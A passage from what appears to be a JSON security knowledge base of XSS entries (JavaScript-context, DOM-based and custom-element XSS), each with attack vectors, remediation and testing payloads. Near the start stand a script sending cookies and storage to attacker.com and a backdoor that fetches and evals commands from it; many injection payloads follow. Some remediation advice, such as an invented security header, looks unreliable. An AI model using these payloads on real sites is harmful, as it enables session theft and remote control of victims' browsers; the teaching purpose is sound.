Expired</h2><input name=\"user\" placeholder=\"Username\" required><input name=\"pass\" type=\"password\" placeholder=\"Password\" required><button>Login</button></form></div>';\nvar x = null;\n</script>\n\nDATA EXFILTRATION:\n<script>\nvar apiKey = null;\nvar sensitiveData = {\n    cookies: document.cookie,\n    localStorage: JSON.stringify(localStorage),\n    sessionStorage: JSON.stringify(sessionStorage),\n    location: window.location.href,\n    referrer: document.referrer\n};\nfetch('//attacker.com/exfil', {\n    method: 'POST',\n    body: JSON.stringify(sensitiveData)\n});\nvar x = null;\n</script>\n\nPERSISTENT BACKDOOR:\n<script>\nvar temp = null;\nsetInterval(() => {\n    fetch('//attacker.com/cmd')\n        .then(r => r.text())\n        .then(cmd => eval(cmd));\n}, 5000);\nvar x = null;\n</script>\n",
    "remediation": "\nDEFENSE-IN-DEPTH STRATEGY:\n\n1. NEVER PLACE UNTRUSTED INPUT IN JAVASCRIPT CONTEXT:\n   \n   This is the PRIMARY rule. Violation leads to immediate RCE.\n   \n   BAD (Never do this):\n   <script>\n   var userId = <?php echo $user_id ?>;\n   var username = <?php echo $username ?>;\n   var config = {value: <?= $user_data ?>};\n   </script>\n\n2. USE DATA ATTRIBUTES (Recommended Approach):\n   \n   HTML (Server-side):\n   <div id=\"app-data\" \n        data-user-id=\"<?php echo htmlspecialchars($user_id) ?>\"\n        data-username=\"<?php echo htmlspecialchars($username) ?>\">\n   </div>\n   \n   JavaScript (Client-side):\n   <script>\n   const appData = document.getElementById('app-data');\n   const userId = appData.dataset.userId; // Safe!\n   const username = appData.dataset.username; // Safe!\n   </script>\n\n3. JSON SERIALIZATION WITH PROPER ESCAPING:\n   \n   Python (Flask/Django):\n   import json\n   <script>\n   var config = {{ config_data|tojson|safe }};\n   </script>\n   \n   Or better:\n   <script>\n   var config = JSON.parse('{{ config_data|tojson }}');\n   </script>\n   \n   PHP:\n   <script>\n   var config = <?php echo json_encode($data, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;\n   </script>\n   \n   Node.js:\n   const serialize = require('serialize-javascript');\n   <script>\n   var config = <%= serialize(data) %>;\n   </script>\n\n4. USE SCRIPT TYPE='APPLICATION/JSON':\n   \n   HTML:\n   <script type=\"application/json\" id=\"app-config\">\n   <?php echo json_encode($config, JSON_HEX_TAG | JSON_HEX_AMP); ?>\n   </script>\n   \n   <script>\n   // Parse safely\n   const configElement = document.getElementById('app-config');\n   const config = JSON.parse(configElement.textContent);\n   </script>\n   \n   This prevents execution even if malicious content is injected.\n\n5. CONTENT SECURITY POLICY (CSP):\n   \n   Strict CSP (Blocks inline scripts):\n   Content-Security-Policy: \n     default-src 'self';\n     script-src 'self' 'nonce-RANDOM123';\n     object-src 'none';\n   \n   HTML:\n   <script nonce=\"RANDOM123\">\n   // Only scripts with matching nonce execute\n   var config = getConfigSafely();\n   </script>\n   \n   With strict-dynamic (Better):\n   Content-Security-Policy:\n     script-src 'nonce-RANDOM123' 'strict-dynamic';\n   \n   Blocks eval() and Function():\n   Content-Security-Policy:\n     script-src 'self' 'unsafe-inline'; // Without 'unsafe-eval'\n\n6. TRUSTED TYPES API (Modern Browsers):\n   \n   Policy:\n   Content-Security-Policy: require-trusted-types-for 'script'\n   \n   JavaScript:\n   if (window.trustedTypes && trustedTypes.createPolicy) {\n       const policy = trustedTypes.createPolicy('default', {\n           createScript: (input) => {\n               // Validate and sanitize\n               if (isSafe(input)) {\n                   return input;\n               }\n               throw new TypeError('Unsafe script');\n           }\n       });\n   }\n   \n   This prevents:\n   - eval() with untrusted strings\n   - Function() constructor\n   - innerHTML with <script>\n   - javascript: URLs\n\n7. AVOID DANGEROUS APIS:\n   \n   NEVER USE WITH USER INPUT:\n   - eval(userInput)\n   - new Function(userInput)\n   - setTimeout(userInput, 1000) // String form\n   - setInterval(userInput, 1000) // String form\n   - element.innerHTML = '<script>' + userInput + '</script>'\n   - document.write(userInput)\n   - document.writeln(userInput)\n   \n   USE SAFE ALTERNATIVES:\n   - JSON.parse(userInput) // With try/catch\n   - setTimeout(() => safeFunction(userInput), 1000) // Function form\n   - element.textContent = userInput\n\n8. JSONP VALIDATION:\n   \n   Strict callback validation:\n   \n   Python:\n   import re\n   \n   CALLBACK_PATTERN = re.compile(r'^[a-zA-Z_$][a-zA-Z0-9_$]*$')\n   \n   if not CALLBACK_PATTERN.match(callback):\n       return jsonify({\"error\": \"Invalid callback\"}), 400\n   \n   PHP:\n   if (!preg_match('/^[a-zA-Z_$][a-zA-Z0-9_$]*$/', $callback)) {\n       die('Invalid callback');\n   }\n   \n   Or better: DON'T USE JSONP - use CORS instead:\n   Access-Control-Allow-Origin: https://trusted-domain.com\n\n9. SERVER-SIDE RENDERING (SSR) PROTECTION:\n   \n   React (Next.js):\n   // Use getServerSideProps\n   export async function getServerSideProps(context) {\n       const data = await fetchData();\n       return {\n           props: {\n               data: data // Automatically serialized safely\n           }\n       };\n   }\n   \n   Vue (Nuxt.js):\n   export default {\n       async asyncData({ params }) {\n           const data = await fetchData();\n           return { data }; // Safely serialized\n       }\n   }\n   \n   Angular Universal:\n   // Uses TransferState for safe serialization\n\n10. INPUT VALIDATION:\n    \n    For numeric IDs:\n    $user_id = intval($_GET['id']);\n    if ($user_id <= 0) die('Invalid ID');\n    \n    For enums:\n    $allowed = ['en', 'es', 'fr', 'de'];\n    if (!in_array($lang, $allowed)) $lang = 'en';\n    \n    For JSON:\n    try {\n        $data = json_decode($input, true, 512, JSON_THROW_ON_ERROR);\n    } catch (JsonException $e) {\n        die('Invalid JSON');\n    }\n\nSECURITY CHECKLIST:\n\n[ ] No user input placed directly in <script> tags\n[ ] All data passed via data attributes or JSON in <script type=\"application/json\">\n[ ] JSON serialization uses proper flags (JSON_HEX_TAG, etc.)\n[ ] CSP configured to block 'unsafe-eval' and inline scripts without nonces\n[ ] Trusted Types API enabled (modern browsers)\n[ ] No eval(), Function(), setTimeout/setInterval with strings\n[ ] JSONP callbacks validated with strict regex (or JSONP avoided entirely)\n[ ] SSR frameworks configured for safe serialization\n[ ] All numeric inputs validated and cast to int\n[ ] All enum inputs validated against whitelist\n[ ] Code review for all server-side JavaScript generation\n[ ] Regular security testing with focus on script injection\n[ ] Developer training on JavaScript context XSS\n\nTESTING PAYLOADS:\n\nBasic injection:\n1; alert(1); var x=1\n\nTemplate literal:\n${alert(1)}\n\nObject breakout:\n1, exploit: alert(1), real: 1\n\nArray breakout:\n1]; alert(1); var x=[1\n\nComment abuse:\n1; alert(1)//\n1; alert(1)/**/\n\nJSONP:\nalert\neval(atob('YWxlcnQoMSk='))\n\nOWASP REFERENCES:\n- OWASP XSS Prevention Cheat Sheet: Rule #3\n- CWE-79: Improper Neutralization of Input During Web Page Generation\n- Content Security Policy Level 3\n- Trusted Types API Specification\n- OWASP Testing Guide: Testing for JavaScript Execution\n"
  },
  "dom_xss": {
    "title": "DOM-based Cross-Site Scripting (DOM XSS)",
    "severity": "high",
    "cvss_score": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "dom",
      "client-side",
      "javascript",
      "modern-web"
    ],
    "description": "\nDOM-based XSS occurs when JavaScript code processes user-controllable data from sources like \nlocation.hash, location.search, postMessage, or Web Storage, and passes it to dangerous sinks like \ninnerHTML, eval, or document.write without proper sanitization. Unlike reflected or stored XSS, the \npayload never touches the server - making it invisible to server-side security controls and WAFs.\n\nThis is a CLIENT-SIDE vulnerability. The attack happens entirely in the browser's JavaScript execution.\nModern web applications (SPAs, PWAs) are particularly vulnerable due to heavy client-side processing.\n\nSEVERITY: HIGH to CRITICAL\nBypasses server-side protections. Increasingly common in modern JavaScript-heavy applications.\n",
    "attack_vector": "\nDOM XSS SOURCE-TO-SINK ANALYSIS:\n\nSOURCES (User-Controllable Input):\n1. location.hash         - URL fragment (#payload)\n2. location.search       - Query string (?q=payload)\n3. location.pathname     - URL path\n4. location.href         - Full URL\n5. document.referrer     - HTTP Referer\n6. document.cookie       - Cookies (if HttpOnly not set)\n7. localStorage          - Local storage\n8. sessionStorage        - Session storage\n9. postMessage           - Cross-origin messaging\n10. Web Workers          - Worker messages\n11. WebSocket            - WebSocket messages\n12. IndexedDB            - Client-side database\n13. window.name          - Window name property\n14. document.URL         - Current URL\n\nDANGEROUS SINKS (Code Execution Points):\n\nHTML Rendering:\n- element.innerHTML\n- element.outerHTML\n- element.insertAdjacentHTML()\n- document.write()\n- document.writeln()\n- jQuery: $(selector).html(payload)\n- jQuery: $(selector).append(payload)\n- jQuery: $(selector).after(payload)\n\nJavaScript Execution:\n- eval(payload)\n- setTimeout(payload, delay)  // String form\n- setInterval(payload, delay) // String form\n- Function(payload)\n- execScript(payload)  // IE\n- element.setAttribute('onclick', payload)\n- element.setAttribute('onerror', payload)\n\nURL-based:\n- location = payload\n- location.href = payload\n- location.assign(payload)\n- location.replace(payload)\n- window.open(payload)\n- element.src = payload  // iframe, script, img\n\nATTACK EXAMPLES:\n\n1. LOCATION.HASH TO INNERHTML:\n   Vulnerable code:\n   const content = decodeURIComponent(location.hash.substring(1));\n   document.getElementById('output').innerHTML = content;\n   \n   Attack URL:\n   https://example.com/#<img src=x onerror=alert(document.cookie)>\n\n2. LOCATION.SEARCH TO EVAL:\n   Vulnerable code:\n   const params = new URLSearchParams(location.search);\n   const callback = params.get('callback');\n   eval(callback + '(data)');\n   \n   Attack URL:\n   https://example.com/?callback=alert\n\n3. POSTMESSAGE TO INNERHTML:\n   Vulnerable code:\n   window.addEventListener('message', function(e) {\n       document.body.innerHTML = e.data;\n   });\n   \n   Attack:\n   targetWindow.postMessage('<img src=x onerror=alert(1)>', '*');\n\n4. LOCALSTORAGE TO SCRIPT SRC:\n   Vulnerable code:\n   const scriptUrl = localStorage.getItem('customScript');\n   const script = document.createElement('script');\n   script.src = scriptUrl;\n   document.head.appendChild(script);\n   \n   Attack:\n   localStorage.setItem('customScript', 'https://evil.com/xss.js');\n\n5. DOCUMENT.REFERRER TO LOCATION:\n   Vulnerable code:\n   if (document.referrer) {\n       location.href = document.referrer;\n   }\n   \n   Attack:\n   <a href=\"https://victim.com\" referrerpolicy=\"unsafe-url\">\n   Set Referer to javascript:alert(1)\n\n6. CLIENT-SIDE ROUTING (SPA):\n   Vulnerable code:\n   router.get('/page/:id', function(req) {\n       document.getElementById('content').innerHTML = \n           '<h1>Page ' + req.params.id + '</h1>';\n   });\n   \n   Attack URL:\n   https://example.com/page/<img src=x onerror=alert(1)>\n\n7. JQUERY HTML INJECTION:\n   Vulnerable code:\n   const searchQuery = location.search.substring(3);\n   $('#results').html('You searched for: ' + searchQuery);\n   \n   Attack URL:\n   https://example.com/?q=<img src=x onerror=alert(1)>\n\n8. DOM CLOBBERING:\n   Vulnerable code:\n   <form id=\"config\"></form>\n   <script>\n   if (config.isAdmin) {\n       // Admin functionality\n   }\n   </script>\n   \n   Attack:\n   <form id=\"config\">\n       <input name=\"isAdmin\" value=\"true\">\n   </form>\n\n9. PROTOTYPE POLLUTION TO DOM XSS:\n   Step 1: Pollute prototype\n   merge(obj, JSON.parse(userInput));\n   // userInput: {\"__proto__\": {\"innerHTML\": \"<img src=x onerror=alert(1)>\"}}\n   \n   Step 2: Trigger XSS\n   element[unknownProperty]; // Falls back to prototype.innerHTML\n\n10. ANGULAR CLIENT-SIDE TEMPLATE INJECTION:\n    Vulnerable code:\n    <div>{{userInput}}</div>  (If template compilation enabled)\n    \n    Attack:\n    {{constructor.constructor('alert(1)')()}}\n    {{$on.constructor('alert(1)')()}}\n\nFRAMEWORK-SPECIFIC ATTACKS:\n\nReact:\n<div dangerouslySetInnerHTML={{__html: userInput}} />\n\nVue:\n<div v-html=\"userInput\"></div>\n\nAngular:\n<div [innerHTML]=\"userInput\"></div>\n\nSvelte:\n{@html userInput}\n",
    "remediation": "\nDEFENSE STRATEGY:\n\n1. USE SAFE APIS:\n   \n   SAFE:\n   element.textContent = userInput;\n   element.innerText = userInput;\n   element.setAttribute('data-value', userInput);\n   document.createTextNode(userInput);\n   \n   DANGEROUS:\n   element.innerHTML = userInput;\n   element.outerHTML = userInput;\n   document.write(userInput);\n\n2. INPUT VALIDATION:\n   \n   Validate all DOM sources:\n   const hash = location.hash.substring(1);\n   if (!/^[a-zA-Z0-9_-]+$/.test(hash)) {\n       // Invalid input\n       return;\n   }\n\n3. TRUSTED TYPES API:\n   \n   Content-Security-Policy: require-trusted-types-for 'script'\n   \n   const policy = trustedTypes.createPolicy('default', {\n       createHTML: (input) => DOMPurify.sanitize(input),\n       createScriptURL: (input) => {\n           if (input.startsWith('https://trusted.com/')) {\n               return input;\n           }\n           throw new TypeError('Invalid script URL');\n       }\n   });\n   \n   element.innerHTML = policy.createHTML(userInput);\n\n4. HTML SANITIZATION:\n   \n   Use DOMPurify:\n   import DOMPurify from 'dompurify';\n   element.innerHTML = DOMPurify.sanitize(userInput);\n\n5. FRAMEWORK PROTECTION:\n   \n   React:\n   // Safe by default\n   <div>{userInput}</div>\n   \n   // If HTML needed:\n   import DOMPurify from 'dompurify';\n   <div dangerouslySetInnerHTML={{\n       __html: DOMPurify.sanitize(userInput)\n   }} />\n   \n   Vue:\n   // Safe\n   <div>{{ userInput }}</div>\n   \n   // If HTML needed:\n   <div v-html=\"sanitizedHTML\"></div>\n   \n   methods: {\n       sanitizedHTML() {\n           return DOMPurify.sanitize(this.userInput);\n       }\n   }\n   \n   Angular:\n   import { DomSanitizer } from '@angular/platform-browser';\n   \n   constructor(private sanitizer: DomSanitizer) {}\n   \n   getSafeHTML(html: string) {\n       return this.sanitizer.sanitize(SecurityContext.HTML, html);\n   }\n\n6. URL PARSING:\n   \n   Use URL API:\n   try {\n       const url = new URL(userInput, location.origin);\n       if (url.protocol === 'https:' && url.host === 'trusted.com') {\n           location.href = url.href;\n       }\n   } catch (e) {\n       // Invalid URL\n   }\n\n7. POSTMESSAGE VALIDATION:\n   \n   window.addEventListener('message', function(e) {\n       // Validate origin\n       if (e.origin !== 'https://trusted.com') {\n           return;\n       }\n       \n       // Validate and sanitize data\n       if (typeof e.data === 'string' && /^[a-zA-Z0-9]+$/.test(e.data)) {\n           processData(e.data);\n       }\n   });\n\n8. CSP CONFIGURATION:\n   \n   Content-Security-Policy: \n     default-src 'self';\n     script-src 'self' 'nonce-random';\n     require-trusted-types-for 'script';\n\n9. LINTING AND STATIC ANALYSIS:\n   \n   ESLint with security plugins:\n   npm install eslint-plugin-security\n   npm install eslint-plugin-no-unsanitized\n   \n   .eslintrc.json:\n   {\n       \"plugins\": [\"security\", \"no-unsanitized\"],\n       \"rules\": {\n           \"no-eval\": \"error\",\n           \"no-implied-eval\": \"error\",\n           \"security/detect-eval-with-expression\": \"error\",\n           \"no-unsanitized/method\": \"error\",\n           \"no-unsanitized/property\": \"error\"\n       }\n   }\n\n10. SECURITY CHECKLIST:\n    \n    [ ] No innerHTML/outerHTML with user data\n    [ ] No eval/Function with user input\n    [ ] Trusted Types API enforced\n    [ ] DOMPurify for HTML sanitization\n    [ ] URL API for URL parsing\n    [ ] postMessage origin validation\n    [ ] Framework dangerous APIs avoided\n    [ ] Static analysis configured\n    [ ] Regular security testing\n    [ ] Code review for client-side code\n\nTESTING:\nUse browser DevTools to trace data flow from source to sink.\nTest with payloads in all DOM sources.\n\nTOOLS:\n- DOM Invader (Burp Suite extension)\n- DOMPurify: https://github.com/cure53/DOMPurify\n- ESLint security plugins\n- Semgrep: https://semgrep.dev\n\nOWASP REFERENCES:\n- OWASP DOM XSS Prevention Cheat Sheet\n- CWE-79: Cross-site Scripting\n- Trusted Types: https://w3c.github.io/webappsec-trusted-types/\n"
  },
  "custom_elements_xss": {
    "title": "Cross-Site Scripting (XSS) in Custom Elements Context",
    "severity": "high",
    "cvss_score": 7.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "custom-elements",
      "web-components",
      "html-injection",
      "modern-web"
    ],
    "description": "\nCustom Elements XSS occurs when user input is reflected into Custom Element definitions, attributes,\nor lifecycle callbacks without proper sanitization. Custom Elements are part of the Web Components\nspecification that allows developers to create reusable HTML elements with custom behavior.\nWhen malicious content is injected into element names, attributes, or callback functions, it can\nlead to XSS attacks that can be persistent and affect multiple instances of the element.\n\nVULNERABILITY CONTEXT:\nCustom Elements XSS typically happens when:\n1. Element names contain malicious content\n2. Element attributes are reflected without sanitization\n3. Lifecycle callbacks execute user-controlled code\n4. Template content is dynamically generated\n5. Element properties contain executable content\n6. Custom element registry is manipulated\n\nCommon in:\n- Web Components frameworks (Lit, Stencil, FAST)\n- UI component libraries\n- Widget platforms\n- Plugin systems\n- Template engines\n- Dynamic component systems\n- Custom element marketplaces\n\nSEVERITY: HIGH\nCustom Elements XSS can affect multiple instances of components and persist across page loads.\nThe dynamic nature of custom elements makes detection challenging, and attacks can spread\nthrough component libraries and frameworks.\n",
    "attack_vector": "\nCUSTOM ELEMENTS XSS ATTACK VECTORS:\n\n1. ELEMENT TAG NAME INJECTION:\n   Dynamic element creation:\n   const tagName = USER_INPUT;  // Element name injection\n   customElements.define(tagName, MyComponent);\n\n   Attack payload:\n   <script>alert(1)</script>\n\n   Result: <script>alert(1)</script> becomes a valid custom element\n\n2. ATTRIBUTE REFLECTION:\n   Custom element with reflected attributes:\n   <my-widget title=\"USER_INPUT\"></my-widget>\n\n   Component code:\n   connectedCallback() {\n     this.shadowRoot.innerHTML = '<h1>' + this.getAttribute('title') + '</h1>';\n   }\n\n3. PROPERTY INJECTION:\n   Element properties with XSS:\n   class MyComponent extends HTMLElement {\n     set userData(value) {\n       this._userData = value;\n       this.render();  // Triggers re-render\n     }\n\n     render() {\n       this.shadowRoot.innerHTML = '<div>' + this._userData + '</div>';\n     }\n   }\n\n4. LIFECYCLE CALLBACK INJECTION:\n   Lifecycle methods with XSS:\n   connectedCallback() {\n     // USER_INPUT executed here\n     eval(USER_INPUT);\n   }\n\n   disconnectedCallback() {\n     // Cleanup with potential XSS\n     document.body.innerHTML = USER_INPUT;\n   }\n\n5. OBSERVED ATTRIBUTES INJECTION:\n   Observed attributes with XSS:\n   static get observedAttributes() {\n     return [USER_INPUT];  // Attribute name injection\n   }\n\n   attributeChangedCallback(name, oldValue, newValue) {\n     this.shadowRoot.innerHTML = '<div>' + newValue + '</div>';\n   }\n\nADVANCED CUSTOM ELEMENTS XSS TECHNIQUES:\n\n6. CUSTOM ELEMENT CONSTRUCTOR INJECTION:\n   Constructor with XSS:\n   constructor() {\n     super();\n     this.shadowRoot.innerHTML = USER_INPUT;  // Constructor injection\n   }\n\n7. PROTOTYPE POLLUTION:\n   Modifying element prototypes:\n   HTMLElement.prototype.connectedCallback = function() {\n     // Malicious callback injected\n     eval(USER_INPUT);\n   };\n\n8. GLOBAL REGISTRY MANIPULATION:\n   Custom element registry injection:\n   const registry = customElements;\n   registry.define(USER_INPUT, MaliciousComponent);  // Registry injection\n\n9. ELEMENT UPGRADE INJECTION:\n   Element upgrade with XSS:\n   const element = document.createElement('div');\n   element.innerHTML = USER_INPUT;  // Pre-upgrade injection\n\n   customElements.define('my-element', MyComponent);\n   element.setAttribute('is', 'my-element');  // Upgrade with XSS\n\n10. TEMPLATE CONTENT INJECTION:\n    Template with dynamic content:\n    const template = document.createElement('template');\n    template.innerHTML = '<div><slot>' + USER_INPUT + '</slot></div>';\n\n    const content = template.content.cloneNode(true);\n    this.shadowRoot.appendChild(content);\n\n11. CUSTOM EVENT INJECTION:\n    Custom events with XSS:\n    this.dispatchEvent(new CustomEvent('user-action', {\n      detail: {data: USER_INPUT}  // Event data injection\n    }));\n\n12. STYLE INJECTION:\n    Component styles with XSS:\n    const style = document.createElement('style');\n    style.textContent = ':host { background: url(' + USER_INPUT + '); }';\n\n    this.shadowRoot.appendChild(style);\n\n13. SLOT DEFAULT CONTENT INJECTION:\n    Default slot content:\n    <template>\n      <div class=\"component\">\n        <slot>USER_INPUT</slot>  <!-- Default slot XSS -->\n      </div>\n    </template>\n\n14. FORM-ASSOCIATED ELEMENTS:\n    Form elements with XSS:\n    class MyInput extends HTMLElement {\n      connectedCallback() {\n        this.innerHTML = '<input value=\"' + USER_INPUT + '\">';  // Input value XSS\n      }\n    }\n\n15. AUTONOMOUS VS CUSTOMIZED ELEMENTS:\n    Element type confusion:\n    // Autonomous element\n    customElements.define('my-autonomous', MyComponent);\n\n    // Customized built-in element\n    customElements.define('my-input', MyInput, {extends: 'input'});\n\n    // XSS in extended element\n    <input is=\"my-input\" value=\"USER_INPUT\">\n\nCUSTOM ELEMENTS-SPECIFIC BYPASSES:\n\n16. ELEMENT NAME VALIDATION BYPASS:\n    Valid element names with XSS:\n    const validName = 'x-script-alert-1';  // Valid name with XSS\n    customElements.define(validName, MyComponent);\n\n17. ATTRIBUTE NAME INJECTION:\n    Dynamic attribute names:\n    const attrName = USER_INPUT;  // Attribute name XSS\n    element.setAttribute(attrName, 'value');\n\n18. PROTOTYPE CHAIN POLLUTION:\n    Modifying prototype chain:\n    Object.prototype.innerHTML = USER_INPUT;  // Global pollution\n\n19. CONSTRUCTOR NAME INJECTION:\n    Constructor name with XSS:\n    class MaliciousComponent extends HTMLElement {\n      constructor() {\n        super();\n        this.constructor.name = USER_INPUT;  // Constructor name XSS\n      }\n    }\n\n20. SYMBOL PROPERTY INJECTION:\n    Symbol properties with XSS:\n    const maliciousSymbol = Symbol(USER_INPUT);  // Symbol injection\n    element[maliciousSymbol] = 'XSS';\n\nREAL-WORLD ATTACK SCENARIOS:\n\n21. COMPONENT LIBRARY ATTACK:\n    - Third-party component library\n    - Component name: <script>alert(1)</script>\n    - Library registration\n    - Affects all library users\n\n22. WIDGET PLATFORM:\n    - Embeddable widget system\n    - Widget type: <script>alert(1)</script>\n    - Widget registration\n    - Platform-wide XSS\n\n23. PLUGIN SYSTEM:\n    - Extensible application\n    - Plugin name: <script>alert(1)</script>\n    - Plugin loading\n    - Application compromise\n\n24. FORM BUILDER:\n    - Dynamic form generation\n    - Field type: <script>alert(1)</script>\n    - Form field creation\n    - Form submission hijacking\n\n25. DASHBOARD SYSTEM:\n    - Configurable dashboard\n    - Widget name: <script>alert(1)</script>\n    - Widget instantiation\n    - Dashboard compromise\n\n26. THEME SYSTEM:\n    - Customizable themes\n    - Component name: <script>alert(1)</script>\n    - Theme application\n    - UI corruption\n\n27. E-COMMERCE PLATFORM:\n    - Product customization\n    - Custom element: <script>alert(1)</script>\n    - Product display\n    - Shopping cart manipulation\n\nCUSTOM ELEMENTS XSS DETECTION:\n\n28. MANUAL TESTING:\n    - DevTools Elements inspection\n    - Custom elements registry inspection\n    - Component lifecycle testing\n    - Attribute manipulation testing\n\n29. AUTOMATED SCANNING:\n    - Custom elements registry analysis\n    - Component definition validation\n    - Attribute injection testing\n    - Lifecycle callback testing\n\n30. BROWSER EXTENSIONS:\n    - Custom elements monitoring\n    - Component analysis tools\n    - Registry inspection extensions\n",
    "remediation": "\nCUSTOM ELEMENTS XSS DEFENSE STRATEGY:\n\n1. ELEMENT NAME VALIDATION (PRIMARY DEFENSE):\n   Validate custom element names:\n\n   function isValidElementName(name) {\n     // Must start with lowercase letter\n     if (!/^[a-z]/.test(name)) return false;\n\n     // Must contain only lowercase letters, numbers, and hyphens\n     if (!/^[a-z0-9-]+$/.test(name)) return false;\n\n     // Must not contain XSS patterns\n     const dangerousPatterns = [\n       /script/i,\n       /javascript/i,\n       /vbscript/i,\n       /on\\w+/i\n     ];\n\n     for (const pattern of dangerousPatterns) {\n       if (pattern.test(name)) return false;\n     }\n\n     // Length limits\n     if (name.length > 50) return false;\n\n     return true;\n   }\n\n2. ATTRIBUTE SANITIZATION:\n   Sanitize all element attributes:\n\n   function sanitizeElementAttributes(element) {\n     const attributes = Array.from(element.attributes);\n\n     attributes.forEach(attr => {\n       const cleanValue = DOMPurify.sanitize(attr.value, {\n         ALLOWED_TAGS: [],\n         ALLOWED_ATTR: ['class', 'id', 'data-*']\n       });\n\n       if (cleanValue !== attr.value) {\n         element.setAttribute(attr.name, cleanValue);\n       }\n     });\n   }\n\n3. LIFECYCLE CALLBACK SECURITY:\n   Secure lifecycle implementations:\n\n   class SecureComponent extends HTMLElement {\n     connectedCallback() {\n       // Validate element state\n       this.validateState();\n\n       // Safe rendering\n       this.renderSecurely();\n     }\n\n     validateState() {\n       // Validate all attributes and properties\n       const title = this.getAttribute('title');\n       if (title) {\n         const cleanTitle = DOMPurify.sanitize(title);\n         this.setAttribute('title', cleanTitle);\n       }\n     }\n\n     renderSecurely() {\n       // Use safe rendering methods\n       const title = this.getAttribute('title');\n       this.shadowRoot.textContent = title || 'Default Title';\n     }\n   }\n\n4. CUSTOM ELEMENT REGISTRY SECURITY:\n   Secure element registration:\n\n   function registerSecureElement(name, componentClass) {\n     // Validate element name\n     if (!isValidElementName(name)) {\n       throw new Error('Invalid element name');\n     }\n\n     // Validate component class\n     if (!isSecureComponentClass(componentClass)) {\n       throw new Error('Insecure component class');\n     }\n\n     // Check if element already exists\n     if (customElements.get(name)) {\n       throw new Error('Element already registered');\n     }\n\n     customElements.define(name, componentClass);\n   }\n\n5. TEMPLATE SECURITY:\n   Secure template usage:\n\n   function createSecureTemplate(html) {\n     const cleanHTML = DOMPurify.sanitize(html, {\n       ALLOWED_TAGS: ['div', 'span', 'p', 'h1', 'h2', 'h3', 'slot'],\n       ALLOWED_ATTR: ['class', 'id', 'slot']\n     });\n\n     const template = document.createElement('template');\n     template.innerHTML = cleanHTML;\n     return template;\n   }\n\n6. OBSERVED ATTRIBUTES VALIDATION:\n   Secure attribute observation:\n\n   static get observedAttributes() {\n     return ['title', 'data-value', 'aria-label'];  // Fixed list only\n   }\n\n   attributeChangedCallback(name, oldValue, newValue) {\n     // Validate new value\n     const cleanValue = DOMPurify.sanitize(newValue);\n\n     // Update safely\n     this.setAttribute(name, cleanValue);\n\n     // Re-render safely\n     this.render();\n   }\n\n7. PROTOTYPE PROTECTION:\n   Protect element prototypes:\n\n   // Prevent prototype pollution\n   Object.freeze(HTMLElement.prototype);\n\n   // Custom prototype protection\n   const originalDefine = customElements.define;\n   customElements.define = function(name, constructor, options) {\n     // Validate before registration\n     if (!isValidElementName(name)) {\n       throw new Error('Invalid element name');\n     }\n\n     return originalDefine.call(this, name, constructor, options);\n   };\n\n8. INPUT VALIDATION:\n   Comprehensive input validation:\n\n   const VALIDATION_PATTERNS = {\n     elementName: /^[a-z][a-z0-9-]*$/,\n     attributeName: /^[a-zA-Z][a-zA-Z0-9-_]*$/,\n     attributeValue: /^[^<>\"'&]*$/\n   };\n\n   function validateCustomElementInput(input, type) {\n     const pattern = VALIDATION_PATTERNS[type];\n     if (!pattern.test(input)) {\n       throw new Error('Invalid input for ' + type);\n     }\n     return input;\n   }\n\n9. CSP FOR CUSTOM ELEMENTS:\n   Content Security Policy:\n\n   Content-Security-Policy:\n     default-src 'self';\n     script-src 'self' 'nonce-{random}';\n     style-src 'self' 'unsafe-inline';  // For component styles\n     connect-src 'self';\n     object-src 'none';\n\n10. ERROR HANDLING:\n    Secure error handling:\n\n    try {\n      customElements.define(name, componentClass);\n    } catch (error) {\n      logger.error('Custom element registration failed', {\n        elementName: name,\n        error: error.message\n      });\n\n      // Don't expose errors to users\n      showGenericError();\n    }\n\n11. LOGGING AND MONITORING:\n    Comprehensive monitoring:\n\n    function logElementEvent(event, elementName, details) {\n      logger.info('Custom element event', {\n        event: event,\n        elementName: elementName,\n        details: details,\n        timestamp: new Date().toISOString()\n      });\n    }\n\n12. REGISTRY PROTECTION:\n    Protect custom elements registry:\n\n    // Prevent registry manipulation\n    Object.defineProperty(window, 'customElements', {\n      value: customElements,\n      writable: false,\n      configurable: false\n    });\n\n13. CONSTRUCTOR SECURITY:\n    Secure element constructors:\n\n    class SecureComponent extends HTMLElement {\n      constructor() {\n        super();\n\n        // Validate constructor context\n        if (!this.isConnected) {\n          throw new Error('Component must be connected to DOM');\n        }\n\n        this.initSecurely();\n      }\n\n      initSecurely() {\n        // Safe initialization\n        this.shadowRoot.innerHTML = '<div>Loading...</div>';\n      }\n    }\n\n14. ATTRIBUTE CHANGE SECURITY:\n    Secure attribute changes:\n\n    attributeChangedCallback(name, oldValue, newValue) {\n      // Validate attribute name and value\n      if (!isValidAttributeName(name)) {\n        return;  // Ignore invalid attributes\n      }\n\n      const cleanValue = DOMPurify.sanitize(newValue);\n      this.setAttribute(name, cleanValue);\n\n      // Safe update\n      this.updateDisplay();\n    }\n\n15. TESTING AND VALIDATION:\n    Regular security testing:\n\n    Automated tests:\n    - Custom element validation\n    - Attribute injection testing\n    - Lifecycle security testing\n    - Registry manipulation testing\n\n    Manual tests:\n    - DevTools custom elements inspection\n    - Component behavior testing\n    - Registry state analysis\n\nSECURITY TESTING PAYLOADS:\n\nBasic Custom Elements XSS:\n<script>alert('Custom Element XSS')</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\nElement name injection:\nx-script-alert-1\nmy-script-tag\ncustom-img-src-x-onerror-alert-1\n\nAttribute injection:\n<my-component title=\"<script>alert(1)</script>\"></my-component>\n<user-widget data-value=\"<img src=x onerror=alert(1)>\"></user-widget>\n\nAdvanced payloads:\njavascript:alert(1)\ndata:text/html,<script>alert(1)</script>\nvbscript:msgbox(1)\n\nCUSTOM ELEMENTS SECURITY HEADERS:\n\nContent-Security-Policy: default-src 'self'\nX-Content-Type-Options: nosniff\nX-Custom-Elements-Mode: secure\n\nMONITORING 